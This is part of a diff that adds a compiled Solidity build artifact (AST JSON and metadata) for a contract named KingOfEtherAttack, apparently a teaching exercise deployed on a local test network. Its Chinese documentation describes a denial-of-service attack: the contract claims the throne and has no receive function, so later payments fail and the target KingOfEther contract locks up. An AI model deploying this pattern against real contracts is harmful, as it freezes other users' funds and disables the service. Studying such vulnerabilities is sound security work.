+                          "src": "696:9:10",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        }
+                      ],
+                      "src": "665:41:10",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
+                        "typeString": "function () payable external"
+                      }
+                    },
+                    "id": 893,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "665:43:10",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 894,
+                  "nodeType": "ExpressionStatement",
+                  "src": "665:43:10"
+                }
+              ]
+            },
+            "documentation": {
+              "id": 871,
+              "nodeType": "StructuredDocumentation",
+              "src": "432:46:10",
+              "text": " 构造函数 - 成为国王"
+            },
+            "id": 896,
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 874,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 873,
+                  "mutability": "mutable",
+                  "name": "_kingOfEther",
+                  "nameLocation": "503:12:10",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 896,
+                  "src": "495:20:10",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 872,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "495:7:10",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "494:22:10"
+            },
+            "returnParameters": {
+              "id": 875,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "525:0:10"
+            },
+            "scope": 910,
+            "src": "483:232:10",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 908,
+              "nodeType": "Block",
+              "src": "962:60:10",
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [],
+                    "expression": {
+                      "argumentTypes": [],
+                      "expression": {
+                        "argumentTypes": [],
+                        "expression": {
+                          "id": 900,
+                          "name": "kingOfEther",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 868,
+                          "src": "972:11:10",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_KingOfEther_$861",
+                            "typeString": "contract KingOfEther"
+                          }
+                        },
+                        "id": 902,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberName": "claimThrone",
+                        "nodeType": "MemberAccess",
+                        "referencedDeclaration": 847,
+                        "src": "972:23:10",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
+                          "typeString": "function () payable external"
+                        }
+                      },
+                      "id": 905,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "names": [
+                        "value"
+                      ],
+                      "nodeType": "FunctionCallOptions",
+                      "options": [
+                        {
+                          "expression": {
+                            "id": 903,
+                            "name": "msg",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 4294967281,
+                            "src": "1003:3:10",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_magic_message",
+                              "typeString": "msg"
+                            }
+                          },
+                          "id": 904,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "memberName": "value",
+                          "nodeType": "MemberAccess",
+                          "src": "1003:9:10",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        }
+                      ],
+                      "src": "972:41:10",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
+                        "typeString": "function () payable external"
+                      }
+                    },
+                    "id": 906,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "972:43:10",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 907,
+                  "nodeType": "ExpressionStatement",
+                  "src": "972:43:10"
+                }
+              ]
+            },
+            "documentation": {
+              "id": 897,
+              "nodeType": "StructuredDocumentation",
+              "src": "839:85:10",
+              "text": " attack - 尝试再次攻击（可选，用于增加锁定金额）"
+            },
+            "functionSelector": "9e5faafc",
+            "id": 909,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nameLocation": "938:6:10",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 898,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "944:2:10"
+            },
+            "returnParameters": {
+              "id": 899,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "962:0:10"
+            },
+            "scope": 910,
+            "src": "929:93:10",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          }
+        ],
+        "scope": 911,
+        "src": "329:695:10",
+        "usedErrors": []
+      }
+    ],
+    "src": "32:993:10"
+  },
+  "compiler": {
+    "name": "solc",
+    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
+  },
+  "networks": {
+    "1776958266254": {
+      "events": {},
+      "links": {},
+      "address": "0xBF9364bcAF568bEb72EF9fB5E5b454659e93611A",
+      "transactionHash": "0x26b6957558a3dd07847a91974b69bd7c66cb915491db1d803c6755781a137a33"
+    }
+  },
+  "schemaVersion": "3.4.16",
+  "updatedAt": "2026-04-24T17:04:26.728Z",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {
+      "attack()": {
+        "notice": "attack - 尝试再次攻击（可选，用于增加锁定金额）"
+      },
+      "constructor": {
+        "notice": "构造函数 - 成为国王"
+      }
+    },
+    "notice": "KingOfEtherAttack - DoS 攻击合约  攻击原理： 成为国王后，让合约没有 receive() 函数 这样当新的挑战者想要成为国王时，向这个合约转账会失败 导致 KingOfEther 合约卡死",
+    "version": 1
+  }
+}
